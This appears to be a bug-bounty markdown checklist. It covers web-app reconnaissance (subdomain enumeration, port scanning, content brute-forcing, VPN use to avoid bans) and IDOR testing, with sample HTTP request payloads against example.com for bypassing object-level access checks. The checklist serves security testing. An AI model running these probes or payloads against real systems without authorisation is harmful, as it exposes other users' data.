# Web-Recon-Checklist
Web App Recon checklist



## Pre-Engagement.

### Recon & analysis for a website.
## Pre-Engagement.
---
 #### Background information abut the asset.

* [ ] Span your VPNs.`Avoids getting banned`.
* [ ] Background story about the asset.
* [ ] Identify web server & technologies.`waplyzer , content type` .

--- 
* [ ] Identify WAF.
* [ ] Check waybackurls.
* [ ] Shodan.
* [ ] Google dorking.`content discovery`.
* [ ] Check /.git.`check the company’s GitHub`.
* [ ] Try to locate /robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml
* [ ] Subdomains Enumeration.`subfinder /crt /waybackurls`.   
* [ ] Probe for **live hosts/domains/subdomains**.`httpx,httprobe , http-toolkit`
* [ ] Resolve the domains to ip address.`IPX`
* [ ] Screenshotting.`HTTPScreenShot ,Gowitness`  
* [ ] Port scanning.`nmap/masscan ..active ports and services` 
* [ ] Directory and Content enumeration.`Gobuster-> bruiteforcing technnique ,Meg, Burp Pro`.
* [ ] check for existing vulnerabilities.`Hacker write-ups, disclosed reports, CVEs, published exploits `.

---
#### Not that important.

* [ ] Find leaked ids, email.
* [ ] Crawl all the site for interesting keywords like password, token, etc
* [ ] Test for debug parameters
* [ ] Identify data entry points
* [ ] Review comments on source code
---

### Fuctionality Mapping.

* [ ] Vulnerabilities Markers.`possible  signs for vulnerabilities`.
* [ ] Goals.`vulns to  check on the asset`.
* [ ] Pointers.
* [ ] site functionality.

---

# IDOR checklist


## usually i can be found in;
- APIs.
- Unique ID.

## Payload checklist.

- [ ] Add parameters to endpoints.
```
GET /api/v1/ **getuser?id=1234** HTTP/1.1
Host: example.com
```
- [ ] HTTP Parameter pollution.
```
POST /api/get_profile HTTP/1.1
Host: example.com

user_id=hacker_id &user_id=victim_id
```
- [ ] Add .json to the endpoint.
```
GET /v2/GetData/1234 HTTP/1.1
Host: example.com
->bypass with this /1234.json
```
- [ ] Test on outdated API versions.
```
POST /v2/GetData HTTP/1.1
Host: example.com
id=123
```
- [ ] Wrap the id with array.

```
POST /api/get_profile HTTP/1.1
Host: example.com
{"user_id":111}
-> bypass with this {"id":[111]} 
```

- [ ] Wrap the ID with a JSON object.
```
POST /api/get_profile HTTP/1.1
Host: example.com
{"user_id":111}
->try to bypass {"user_id":{"user_id":111}}
```
- [ ]